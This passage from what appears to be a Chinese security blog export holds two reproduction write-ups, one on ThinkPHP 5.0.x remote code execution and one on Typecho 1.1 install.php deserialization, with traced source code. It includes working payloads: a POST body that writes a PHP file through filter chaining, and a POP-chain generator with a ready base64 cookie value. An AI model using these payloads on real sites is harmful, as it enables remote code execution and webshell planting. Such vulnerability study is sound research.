&#x2F;&#x2F; 监听app_end\n        Hook::listen(&#39;app_end&#39;, $response);\n\n        return $response;\n    &#125;\n\n很长，前面就是处理，到判断$dispatch才是重点\n&#x2F;&#x2F; 获取应用调度信息\n           $dispatch &#x3D; self::$dispatch;\n           if (empty($dispatch)) &#123;\n               &#x2F;&#x2F; 进行URL路由检测\n               $dispatch &#x3D; self::routeCheck($request, $config);\n           &#125;\n           &#x2F;&#x2F; 记录当前调度信息\n           $request-&gt;dispatch($dispatch);\n\n使用routeCheck检查\n&#x2F;**\n     * URL路由检测（根据PATH_INFO)\n     * @access public\n     * @param  \\think\\Request $request\n     * @param  array          $config\n     * @return array\n     * @throws \\think\\Exception\n     *&#x2F;\n    public static function routeCheck($request, array $config)\n    &#123;\n        $path   &#x3D; $request-&gt;path();\n        $depr   &#x3D; $config[&#39;pathinfo_depr&#39;];\n        $result &#x3D; false;\n        &#x2F;&#x2F; 路由检测\n        $check &#x3D; !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];\n        if ($check) &#123;\n            &#x2F;&#x2F; 开启路由\n            if (is_file(RUNTIME_PATH . &#39;route.php&#39;)) &#123;\n                &#x2F;&#x2F; 读取路由缓存\n                $rules &#x3D; include RUNTIME_PATH . &#39;route.php&#39;;\n                if (is_array($rules)) &#123;\n                    Route::rules($rules);\n                &#125;\n            &#125; else &#123;\n                $files &#x3D; $config[&#39;route_config_file&#39;];\n                foreach ($files as $file) &#123;\n                    if (is_file(CONF_PATH . $file . CONF_EXT)) &#123;\n                        &#x2F;&#x2F; 导入路由配置\n                        $rules &#x3D; include CONF_PATH . $file . CONF_EXT;\n                        if (is_array($rules)) &#123;\n                            Route::import($rules);\n                        &#125;\n                    &#125;\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 路由检测（根据路由定义返回不同的URL调度）\n            $result &#x3D; Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);\n            $must   &#x3D; !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];\n            if ($must &amp;&amp; false &#x3D;&#x3D;&#x3D; $result) &#123;\n                &#x2F;&#x2F; 路由无效\n                throw new RouteNotFoundException();\n            &#125;\n        &#125;\n        if (false &#x3D;&#x3D;&#x3D; $result) &#123;\n            &#x2F;&#x2F; 路由无效 解析模块&#x2F;控制器&#x2F;操作&#x2F;参数... 支持控制器自动搜索\n            $result &#x3D; Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]);\n        &#125;\n        return $result;\n    &#125;\n\n\n一堆处理，直到使用check函数\n&#x2F;**\n     * 检测URL路由\n     * @access public\n     * @param Request   $request Request请求对象\n     * @param string    $url URL地址\n     * @param string    $depr URL分隔符\n     * @param bool      $checkDomain 是否检测域名规则\n     * @return false|array\n     *&#x2F;\n    public static function check($request, $url, $depr &#x3D; &#39;&#x2F;&#39;, $checkDomain &#x3D; false)\n    &#123;\n        &#x2F;&#x2F; 分隔符替换 确保路由定义使用统一的分隔符\n        $url &#x3D; str_replace($depr, &#39;|&#39;, $url);\n\n        if (strpos($url, &#39;|&#39;) &amp;&amp; isset(self::$rules[&#39;alias&#39;][strstr($url, &#39;|&#39;, true)])) &#123;\n            &#x2F;&#x2F; 检测路由别名\n            $result &#x3D; self::checkRouteAlias($request, $url, $depr);\n            if (false !&#x3D;&#x3D; $result) &#123;\n                return $result;\n            &#125;\n        &#125;\n        $method &#x3D; strtolower($request-&gt;method());\n        &#x2F;&#x2F; 获取当前请求类型的路由规则\n        $rules &#x3D; self::$rules[$method];\n        &#x2F;&#x2F; 检测域名部署\n        if ($checkDomain) &#123;\n            self::checkDomain($request, $rules, $method);\n        &#125;\n        &#x2F;&#x2F; 检测URL绑定\n        $return &#x3D; self::checkUrlBind($url, $rules, $depr);\n        if (false !&#x3D;&#x3D; $return) &#123;\n            return $return;\n        &#125;\n        if (&#39;|&#39; !&#x3D; $url) &#123;\n            $url &#x3D; rtrim($url, &#39;|&#39;);\n        &#125;\n        $item &#x3D; str_replace(&#39;|&#39;, &#39;&#x2F;&#39;, $url);\n        if (isset($rules[$item])) &#123;\n            &#x2F;&#x2F; 静态路由规则检测\n            $rule &#x3D; $rules[$item];\n            if (true &#x3D;&#x3D;&#x3D; $rule) &#123;\n                $rule &#x3D; self::getRouteExpress($item);\n            &#125;\n            if (!empty($rule[&#39;route&#39;]) &amp;&amp; self::checkOption($rule[&#39;option&#39;], $request)) &#123;\n                self::setOption($rule[&#39;option&#39;]);\n                return self::parseRule($item, $rule[&#39;route&#39;], $url, $rule[&#39;option&#39;]);\n            &#125;\n        &#125;\n\n        &#x2F;&#x2F; 路由规则检测\n        if (!empty($rules)) &#123;\n            return self::checkRoute($request, $rules, $url, $depr);\n        &#125;\n        return false;\n    &#125;\n\n    private static function getRouteExpress($key)\n    &#123;\n        return self::$domainRule ? self::$domainRule[&#39;*&#39;][$key] : self::$rules[&#39;*&#39;][$key];\n    &#125;\n\n\n第一个if不用看，下面直接调用最开始实例化的request对象的method方法\n这个request对象是在run方法开始的时候实例化的\nmethod为false，直接通过\n$this-&gt;method = strtoupper($_POST[Config::get(‘var_method’)]);\n​                $this-&gt;{$this-&gt;method}($_POST);\n获取_method的值，动态调用，所以传入的_method=__construct\n赋值给$method和$filter\n直到回到run函数，继续往下走，就会执行到param函数\n&#x2F;&#x2F; 获取应用调度信息\n            $dispatch &#x3D; self::$dispatch;\n            if (empty($dispatch)) &#123;\n                &#x2F;&#x2F; 进行URL路由检测\n                $dispatch &#x3D; self::routeCheck($request, $config);\n            &#125;\n            &#x2F;&#x2F; 记录当前调度信息\n            $request-&gt;dispatch($dispatch);\n\n            &#x2F;&#x2F; 记录路由和请求信息\n            if (self::$debug) &#123;\n                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);\n                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);\n                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);\n            &#125;\n\n走到下面这个if判断的时候，获取$debug属性值，默认ture。所以就会走到\nLog::record(‘[ PARAM ] ‘.var_export($request-&gt;param(), true), ‘info’);\n这个时候就完成了命令执行的第二步，获取POST的数据whoami放到$var里面，最后是$data里，前面设置了$filter为system，最后通过call_user_func来执行命令。\n如果没有开启debug模式，就不会到达第二步触发命令执行。所以，这个洞才强调需要开启debug模式才行。\n第二个payload：URL地址\nurl&#x2F;public&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode\nPOST数据\npath&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3k0dGFja2VyLnBocCcsJzw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET\n\n这个也是y4tacker文章中使用的payload，用到一个特性，在特定条件下，可以通过::调用非静态方法\n这个payload触发param的地方，在于将$dispatch[‘type’]的值设置为method，通过switch，调用param函数。具体理解看下面了：\n看一下这个payload，先是路由?s=captcha&amp;g=implode，接着POST传入了一段base64编码的php语句，_mehtod属性为__construct方法，传入的$filter[]有多个，和method为GET\n不了解路由有什么用，看下文章。文中说传入captcha是为了获取路由\n很尴尬，我这个5.0.6版本的tp没有captcha。我尝试去掉captcha，只留下implode发现也能写入成功，同时页面也就没有了captcha模块不存在的错误。\n这个implode就是使用implode模块的意思，前面的g可以换成任意字母\n同时页面报错implode最多需要两个参数，传入了五个，这是不是表示implode是函数的意思。基础不牢地动天摇，你妹的，这是php内置函数，作用是字符串连接数组的\n先进入run方法，之后if判断$dispatch为空则进入routeCheck方法\n&#x2F;**\n     * URL路由检测（根据PATH_INFO)\n     * @access public\n     * @param  \\think\\Request $request\n     * @param  array          $config\n     * @return array\n     * @throws \\think\\Exception\n     *&#x2F;\n    public static function routeCheck($request, array $config)\n    &#123;\n        $path   &#x3D; $request-&gt;path();\n        $depr   &#x3D; $config[&#39;pathinfo_depr&#39;];\n        $result &#x3D; false;\n        &#x2F;&#x2F; 路由检测\n        $check &#x3D; !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];\n        if ($check) &#123;\n            &#x2F;&#x2F; 开启路由\n            if (is_file(RUNTIME_PATH . &#39;route.php&#39;)) &#123;\n                &#x2F;&#x2F; 读取路由缓存\n                $rules &#x3D; include RUNTIME_PATH . &#39;route.php&#39;;\n                if (is_array($rules)) &#123;\n                    Route::rules($rules);\n                &#125;\n            &#125; else &#123;\n                $files &#x3D; $config[&#39;route_config_file&#39;];\n                foreach ($files as $file) &#123;\n                    if (is_file(CONF_PATH . $file . CONF_EXT)) &#123;\n                        &#x2F;&#x2F; 导入路由配置\n                        $rules &#x3D; include CONF_PATH . $file . CONF_EXT;\n                        if (is_array($rules)) &#123;\n                            Route::import($rules);\n                        &#125;\n                    &#125;\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 路由检测（根据路由定义返回不同的URL调度）\n            $result &#x3D; Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);\n            $must   &#x3D; !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];\n            if ($must &amp;&amp; false &#x3D;&#x3D;&#x3D; $result) &#123;\n                &#x2F;&#x2F; 路由无效\n                throw new RouteNotFoundException();\n            &#125;\n        &#125;\n        if (false &#x3D;&#x3D;&#x3D; $result) &#123;\n            &#x2F;&#x2F; 路由无效 解析模块&#x2F;控制器&#x2F;操作&#x2F;参数... 支持控制器自动搜索\n            $result &#x3D; Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]);\n        &#125;\n        return $result;\n    &#125;\n\n之后一样进入check方法，进行属性覆盖，最后进入param方法\n这个implode是通过param方法中的get方法\n $this-&gt;param &#x3D; array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\nif (empty($this-&gt;get)) &#123;\n            $this-&gt;get &#x3D; $_GET;\n        &#125;\n\n这样这个get属性就变成了implode，之后进入input方法\n返回get的值，再将这个值和$vars合并在一起\nswitch ($method) &#123;\n               case&#39;POST&#39;:\n                   $vars &#x3D; $this-&gt;post(false);\n                   break;\n               case&#39;PUT&#39;:\n               case&#39;DELETE&#39;:\n               case&#39;PATCH&#39;:\n                   $vars &#x3D; $this-&gt;put(false);\n                   break;\n               default:\n                   $vars &#x3D; [];\n           &#125;\n\n但是，这次的method的值为GET，所以只有一个get值，最后进入param方法最下面的input方法\nif (is_array($data)) &#123;\n            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);\n            reset($data);\n        &#125; else &#123;\n            $this-&gt;filterValue($data, $name, $filter);\n        &#125;\n\n通过array_walk_recursive进行过滤，又进入filterValue方法\nforeach ($filters as $filter) &#123;\n            if (is_callable($filter)) &#123;\n                &#x2F;&#x2F; 调用函数或者方法过滤\n                $value &#x3D; call_user_func($filter, $value);\n\n遍历filter数组分别进行过滤$value的值，这时的$value为impolde，filter[]为set_error_handler，self::path，base64_decode，\\think\\view\\driver\\Php::Display\nset_error_handler方法，看y4tacker的描述：\n这里面还有一个比较巧妙的地方是set_error_handler的使用， tp5 默认就调用了 error_reporting(E_ALL) ，且有一套内置的错误处理机制。上面预期解也提到了即使报了 warning 程序也会中止执行。set_error_handler() 函数设置用户自定义的错误处理程序，会绕过标准 PHP 错误处理程序。其他的还有set_exception_handler() 函数设置用户自定义的异常处理函数。register_shutdown_function() 函数会注册一个会在PHP中止时执行的函数\n之后就是self::path函数，返回path属性，也就base64编码的值，之后通过base64_decode进行解码，再通过Php::Display的eval执行代码，写入shell文件\n综上，需要implode是为了防止报错导致停止执行\n传入captche是为了让其他版本的tp的checkRoute返回路由，之后通过返回type为method\nswitch ($dispatch[&#39;type&#39;]) &#123;\n                case &#39;redirect&#39;:\n                    &#x2F;&#x2F; 执行重定向跳转\n                    $data &#x3D; Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)-&gt;code($dispatch[&#39;status&#39;]);\n                    break;\n                case &#39;module&#39;:\n                    &#x2F;&#x2F; 模块&#x2F;控制器&#x2F;操作\n                    $data &#x3D; self::module($dispatch[&#39;module&#39;], $config, isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null);\n                    break;\n                case &#39;controller&#39;:\n                    &#x2F;&#x2F; 执行控制器操作\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; Loader::action($dispatch[&#39;controller&#39;], $vars, $config[&#39;url_controller_layer&#39;], $config[&#39;controller_suffix&#39;]);\n                    break;\n                case &#39;method&#39;:\n                    &#x2F;&#x2F; 执行回调方法\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; self::invokeMethod($dispatch[&#39;method&#39;], $vars);\n                    break;\n\n在通过switch调用param方法，来进行写入文件。这样可以免除debug模式开启的条件。\n吐槽：这第二个payload一开始还真是弄不明白，跟到最后总算知道它的作用了\n这个洞太复杂，真的很难跟，而且还是用没开debug模式的vs直接一个一个看的，真纯静态分析！！！麻烦。。。。。\n没有调试过，有错误很正常。。。。。\n等弄好debug在调试看看吧！\n终于弄完了，干！！！\n","slug":"TP5-0-5-0-23RCE","date":"2022-10-19T13:20:47.000Z","categories_index":"RCE","tags_index":"thinphp","author_index":"Longw"},{"id":"10d60eae5b46a090616c469686df0945","title":"Typecho1.1反序列化复现","content":"\n\n参考资料：https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1.md\n复现：常见的博客系统，在1.1版本的install.php文件中存在反序列化漏洞\n阅读index.php，在没有安装时，会默认跳转到install.php执行\n在install.php中，想要到达unserialize触发点，必须先进行博客安装，才会生成/config.inc.php\n&#x2F;&#x2F;判断是否已经安装\nif (!isset($_GET[&#39;finish&#39;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;) &amp;&amp; empty($_SESSION[&#39;typecho&#39;])) &#123;\n    exit;\n&#125;\n\n&#x2F;&#x2F; 挡掉可能的跨站请求\nif (!empty($_GET) || !empty($_POST)) &#123;\n    if (empty($_SERVER[&#39;HTTP_REFERER&#39;])) &#123;\n        exit;\n    &#125;\n\n    $parts &#x3D; parse_url($_SERVER[&#39;HTTP_REFERER&#39;]);\n\tif (!empty($parts[&#39;port&#39;])) &#123; &#x2F;&#x2F;port不为空执行\n        $parts[&#39;host&#39;] &#x3D; &quot;&#123;$parts[&#39;host&#39;]&#125;:&#123;$parts[&#39;port&#39;]&#125;&quot;;\n    &#125;\n\n    if (empty($parts[&#39;host&#39;]) || $_SERVER[&#39;HTTP_HOST&#39;] !&#x3D; $parts[&#39;host&#39;]) &#123;&#x2F;&#x2F;看是否来自于自身的连接\n        exit;\n    &#125;\n&#125;\n\nget请求携带finish参数，进行了安装，session中不存在typecho的值，就会执行下面的代码\n后面部分代码就是一些函数，直接看unserialize触发点\n&lt;?php if (isset($_GET[&#39;finish&#39;])) : ?&gt;\n                &lt;?php if (!@file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;)) : ?&gt;\n                &lt;h1 class&#x3D;&quot;typecho-install-title&quot;&gt;&lt;?php _e(&#39;安装失败!&#39;); ?&gt;&lt;&#x2F;h1&gt;\n                &lt;div class&#x3D;&quot;typecho-install-body&quot;&gt;\n                    &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;?config&quot; name&#x3D;&quot;config&quot;&gt;\n                    &lt;p class&#x3D;&quot;message error&quot;&gt;&lt;?php _e(&#39;您没有上传 config.inc.php 文件，请您重新安装！&#39;); ?&gt; &lt;button class&#x3D;&quot;btn primary&quot; type&#x3D;&quot;submit&quot;&gt;&lt;?php _e(&#39;重新安装 &amp;raquo;&#39;); ?&gt;&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;\n                    &lt;&#x2F;form&gt;\n                &lt;&#x2F;div&gt;\n                &lt;?php elseif (!Typecho_Cookie::get(&#39;__typecho_config&#39;)): ?&gt;\n                &lt;h1 class&#x3D;&quot;typecho-install-title&quot;&gt;&lt;?php _e(&#39;没有安装!&#39;); ?&gt;&lt;&#x2F;h1&gt;\n                &lt;div class&#x3D;&quot;typecho-install-body&quot;&gt;\n                    &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;?config&quot; name&#x3D;&quot;config&quot;&gt;\n                    &lt;p class&#x3D;&quot;message error&quot;&gt;&lt;?php _e(&#39;您没有执行安装步骤，请您重新安装！&#39;); ?&gt; &lt;button class&#x3D;&quot;btn primary&quot; type&#x3D;&quot;submit&quot;&gt;&lt;?php _e(&#39;重新安装 &amp;raquo;&#39;); ?&gt;&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;\n                    &lt;&#x2F;form&gt;\n                &lt;&#x2F;div&gt;\n                &lt;?php else : ?&gt;\n                    &lt;?php\n                    $config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));\n                    Typecho_Cookie::delete(&#39;__typecho_config&#39;);\n                    $db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);\n                    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\n                    Typecho_Db::set($db);\n                    ?&gt;\n\n和前面一样，需要存在finish，已经安装，并且通过get函数获取了__typecho_config\n这个值。看一下get函数\n&#x2F;**\n     * 获取指定的COOKIE值\n     *\n     * @access public\n     * @param string $key 指定的参数\n     * @param string $default 默认的参数\n     * @return mixed\n     *&#x2F;\n    public static function get($key, $default &#x3D; NULL)\n    &#123;\n        $key &#x3D; self::$_prefix . $key;\n        $value &#x3D; isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);\n        return is_array($value) ? $default : $value;\n    &#125;\n\n$_prefix默认设置为空，看cookie里面是否有__typecho_config的值。如果没有，看这个值在post里面有没有。有则看是否为数组，不是数组则返回该值。\n然后就会执行到触发点\n&lt;?php\n$config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));\nTypecho_Cookie::delete(&#39;__typecho_config&#39;);\n$db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);\n$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\nTypecho_Db::set($db);\n?&gt;\n\n对获取到的__typecho_config的值进行base64解码，并将它进行反序列化。\n到这里就有点懵逼，看了下大佬的教程，接下来需要找可以利用的魔术方法\n一般找析构函数__destruct()，全局搜索，函数用来unset值，和fclose关闭文件\n然后看下面代码，获取$config里面的adapter的值，和prefix的值，来实例化一个Typecho_Db对象，看一下这个类的构造函数能不能利用\n&#x2F;**\n     * 数据库类构造函数\n     *\n     * @param mixed $adapterName 适配器名称\n     * @param string $prefix 前缀\n     * @throws Typecho_Db_Exception\n     *&#x2F;\n    public function __construct($adapterName, $prefix &#x3D; &#39;typecho_&#39;)\n    &#123;\n        &#x2F;** 获取适配器名称 *&#x2F;\n        $this-&gt;_adapterName &#x3D; $adapterName;\n\n        &#x2F;** 数据库适配器 *&#x2F;\n        $adapterName &#x3D; &#39;Typecho_Db_Adapter_&#39; . $adapterName;\n\n        if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;\n            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);\n        &#125;\n\n        $this-&gt;_prefix &#x3D; $prefix;\n\n        &#x2F;** 初始化内部变量 *&#x2F;\n        $this-&gt;_pool &#x3D; array();\n        $this-&gt;_connectedPool &#x3D; array();\n        $this-&gt;_config &#x3D; array();\n\n        &#x2F;&#x2F;实例化适配器对象\n        $this-&gt;_adapter &#x3D; new $adapterName();\n    &#125;\n\nprefix就是一个头参数，直接使用默认的就行。而adapter将会进行字符串连接，当adapter是一个类的时候，用 . 连接会触发这个类的__ toString 魔术方法。全局搜索 __ toString()\n有三个使用了，最后找到Feed.php中的__toString方法\n&#x2F;**\n     * 输出字符串\n     *\n     * @access public\n     * @return string\n     *&#x2F;\n    public function __toString()\n    &#123;\n        $result &#x3D; &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;&#39; . $this-&gt;_charset . &#39;&quot;?&gt;&#39; . self::EOL;\n\n        if (self::RSS1 &#x3D;&#x3D; $this-&gt;_type) &#123;\n            $result .&#x3D; &#39;&lt;rdf:RDF\nxmlns:rdf&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;02&#x2F;22-rdf-syntax-ns#&quot;\nxmlns&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;&quot;\nxmlns:dc&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;&gt;&#39; . self::EOL;\n\n            $content &#x3D; &#39;&#39;;\n            $links &#x3D; array();\n            $lastUpdate &#x3D; 0;\n\n            foreach ($this-&gt;_items as $item) &#123;\n                $content .&#x3D; &#39;&lt;item rdf:about&#x3D;&quot;&#39; . $item[&#39;link&#39;] . &#39;&quot;&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;&#x2F;title&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;link&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;dc:date&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;&#x2F;dc:date&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;description&gt;&#39; . strip_tags($item[&#39;content&#39;]) . &#39;&lt;&#x2F;description&gt;&#39; . self::EOL;\n                if (!empty($item[&#39;suffix&#39;])) &#123;\n                    $content .&#x3D; $item[&#39;suffix&#39;];\n                &#125;\n                $content .&#x3D; &#39;&lt;&#x2F;item&gt;&#39; . self::EOL;\n\n                $links[] &#x3D; $item[&#39;link&#39;];\n\n                if ($item[&#39;date&#39;] &gt; $lastUpdate) &#123;\n                    $lastUpdate &#x3D; $item[&#39;date&#39;];\n                &#125;\n            &#125;\n\n\n很长，跳过一段\n else if (self::RSS2 &#x3D;&#x3D; $this-&gt;_type) &#123;\n            $result .&#x3D; &#39;&lt;rss version&#x3D;&quot;2.0&quot;\nxmlns:content&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;modules&#x2F;content&#x2F;&quot;\nxmlns:dc&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;\nxmlns:slash&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;modules&#x2F;slash&#x2F;&quot;\nxmlns:atom&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;Atom&quot;\nxmlns:wfw&#x3D;&quot;http:&#x2F;&#x2F;wellformedweb.org&#x2F;CommentAPI&#x2F;&quot;&gt;\n&lt;channel&gt;&#39; . self::EOL;\n\n            $content &#x3D; &#39;&#39;;\n            $lastUpdate &#x3D; 0;\n\n            foreach ($this-&gt;_items as $item) &#123;\n                $content .&#x3D; &#39;&lt;item&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;&#x2F;title&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;link&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;guid&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;guid&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;pubDate&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;&#x2F;pubDate&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;&#x2F;dc:creator&gt;&#39; . self::EOL;\n\n\n在这里当，_type为RSS2也就是’RSS 2.0‘时，会执行$item[‘author’]-&gt;screenName\n这里如果，author值是一个类，并且screenName是一个私有或者没有定义的值就会触发该类的__get()方法。接下来就是找__get()方法\n在var/typecho/request.php中有个__get()方法\n&#x2F;**\n    * 获取实际传递参数(magic)\n    *\n    * @access public\n    * @param string $key 指定参数\n    * @return mixed\n    *&#x2F;\n   public function __get($key)\n   &#123;\n       return $this-&gt;get($key);\n   &#125;\n\n这个方法调用了get函数\n&#x2F;**\n     * 获取实际传递参数\n     *\n     * @access public\n     * @param string $key 指定参数\n     * @param mixed $default 默认参数 (default: NULL)\n     * @return mixed\n     *&#x2F;\n    public function get($key, $default &#x3D; NULL)\n    &#123;\n        switch (true) &#123;\n            case isset($this-&gt;_params[$key]):\n                $value &#x3D; $this-&gt;_params[$key];\n                break;\n            case isset(self::$_httpParams[$key]):\n                $value &#x3D; self::$_httpParams[$key];\n                break;\n            default:\n                $value &#x3D; $default;\n                break;\n        &#125;\n\n        $value &#x3D; !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;\n        return $this-&gt;_applyFilter($value);\n    &#125;\n\n\n就是判断有没有设置$_params[‘screenName’]的值，或是$_httpParams[‘screenName’]的值，接下来赋值给$value，然后就是调用_applyFilter函数\n&#x2F;**\n     * 应用过滤器\n     *\n     * @access private\n     * @param mixed $value\n     * @return mixed\n     *&#x2F;\n    private function _applyFilter($value)\n    &#123;\n        if ($this-&gt;_filter) &#123;\n            foreach ($this-&gt;_filter as $filter) &#123;\n                $value &#x3D; is_array($value) ? array_map($filter, $value) :\n                call_user_func($filter, $value);\n            &#125;\n\n            $this-&gt;_filter &#x3D; array();\n        &#125;\n\n        return $value;\n    &#125;\n\n判断赋值的value是不是数组，是数组通过array_map进行过滤函数调用，不是数组就是用call_user_func进行过滤函数调用。很奇怪前面经过判断，$value是数组的话，就会赋值成空。这里应该是其他地方也使用了这个函数，所以逻辑严谨一点，才会对$value的类型进行了判断。\n这里的$_filter和前面的$_params都是可控的内部参数，只需要将$_filter设置为代码执行函数，$_params[‘screenName’]设置为需要执行的代码。通过call_user_func来执行代码。\n&lt;?php\n\nclass Typecho_Request&#123;\n    &#x2F;&#x2F;$_params数组里有screenName则会取用$_params里的值，赋给$value\n    private $_params&#x3D;array(&#39;screenName&#39;&#x3D;&gt;&#39;eval(\\&#39;phpinfo();exit();\\&#39;)&#39;);\n    &#x2F;&#x2F;通过过滤函数，过滤$value的值\n    private $_filter&#x3D;array(&#39;assert&#39;);\n&#125;\n\nclass Typecho_Feed&#123;\n    private $_type &#x3D; &#39;RSS 2.0&#39;;&#x2F;&#x2F;需要其通过前面的判断\n    private $_items;\n    public function __construct()\n    &#123;\n        $this-&gt;_items[]&#x3D;array(&#39;author&#39;&#x3D;&gt;new Typecho_Request());\n    &#125;\n&#125;\n&#x2F;&#x2F;接下来就是实例化Typecho_Feed对象，赋值给adapter\n&#x2F;&#x2F;通过反序列化，取adapter的值\n&#x2F;&#x2F;adapter是对象，触发Typecho_Feed的__toString方法\n&#x2F;&#x2F;获取author的screenName的值，author是Typecho_Request对象，且screenName是私有的\n&#x2F;&#x2F;触发Typecho_Request的__get()方法，通过call_user_func命令执行\n$payload &#x3D; array(&#39;adapter&#39;&#x3D;&gt;new Typecho_Feed());\n&#x2F;&#x2F;反序列化前进行了base64解码，所以需要编码\necho base64_encode(serialize($payload));\n&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;install.php?finish&#x3D;11111\n&#x2F;&#x2F;Referer需要是从自身来的：http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;install.php\n&#x2F;&#x2F;__typecho_config&#x3D;YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoyNToiZXZhbCgncGhwaW5mbygpO2V4aXQoKTsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19\n?&gt;\n\n$_filter默认是空数组，这里使用foreach，遍历取值，所以payload中$_filter=array(‘assert’); 还在奇怪为什么传入数组到call_user_func。传入数组到call_user_func的回调参数，是使用某个类的某个方法，一般形式是\ncall_user_func(array(‘a’,’b’),’xxxx’);\n为什么这里payload *phpinfo();exit();中有exit()* ,因为程序开始使用了****ob_start() 这个函数会把输出放进缓冲区，触发异常后****ob_end_clean() 